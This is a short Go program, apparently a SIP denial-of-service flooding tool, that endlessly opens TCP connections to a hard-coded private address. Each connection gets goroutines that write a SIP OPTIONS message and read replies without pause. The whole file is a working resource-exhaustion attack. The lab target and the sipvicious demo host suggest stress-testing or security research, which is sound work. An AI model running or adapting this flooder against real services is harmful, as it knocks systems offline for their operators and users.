package main

import (
	"fmt"
	"log"
	"net"
)

const target = "10.0.60.23:3000"

func flood() {
	fmt.Printf("Starting traffic generation to %s...\n", target)

	payload := "OPTIONS sip:demo.sipvicious.pro SIP/2.0\r\n" +
		"Content-Length: 0\r\n\r\n"
	b := make([]byte, 1024)

	for {
		c, err := net.Dial("tcp", target)
		if err != nil {
			log.Fatal(err)
		}

		// Read loop
		go func() {
			for {
				c.Read(b)
			}
		}()

		// Write loop
		go func() {
			for {
				c.Write([]byte(payload))
			}
		}()
	}
}

func main() {
	flood()
}
